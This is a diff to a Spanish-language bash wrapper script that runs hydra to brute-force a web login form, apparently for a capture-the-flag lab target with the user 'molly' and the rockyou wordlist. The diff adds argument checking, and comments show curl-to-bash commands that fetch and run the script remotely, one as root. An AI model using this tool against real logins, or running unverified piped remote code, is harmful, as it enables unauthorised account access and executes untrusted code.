@@ -9,7 +9,7 @@
 # Script de NiPeGun para instalar la máxima cantidad posible de WordLists en texto plano en Debian
 #
 # Ejecución remota con parámetros (puede requerir permisos sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt''
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt'
 #
 # Ejecución remota como root (para sistemas sin sudo):
 #   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | sed 's-sudo--g' | bash
@@ -17,12 +17,37 @@
 # Bajar y editar directamente el archivo en nano
 #   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | nano -
 # ----------
-vIP="$1"
-vSubURL="$2"
-vUserField="$3"
-vPassField="$4"
-vUsuario="$5"
-vUbicDicc="$6"
+
+# Definir la cantidad de argumentos esperados
+  cCantParamEsperados=6
+
+# Comprobar que se hayan pasado la cantidad de parámetros correctos. Abortar el script si no.
+  if [ $# -ne $cCantParamEsperados ]
+    then
+      echo ""
+      echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
+      echo ""
+      if [[ "$0" == "bash" ]]; then
+        vNombreDelScript="script.sh"
+      else
+        vNombreDelScript="$0"
+      fi
+      echo "    $vNombreDelScript [IP] [SubURL] [NombreCampoUsuario] [NombreCampoPassword] [NombreDeUsuarioAIntentar] [UbicDelDiccionarioDePassword]"
+      echo ""
+      echo "  Ejemplo:"
+      echo ""
+      echo "    $vNombreDelScript '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt'"
+      echo ""
+      exit
+  fi
+
+# Crear variables con los parámetros
+  vIP="$1"
+  vSubURL="$2"
+  vUserField="$3"
+  vPassField="$4"
+  vUsuario="$5"
+  vUbicDicc="$6"
 
 # Determinar el código HTML que devuelve un login fallido
   # Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
@@ -75,3 +100,4 @@ vUbicDicc="$6"
   echo "  Probando ataque de fuerza bruta..."
   echo ""
   sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText"
+
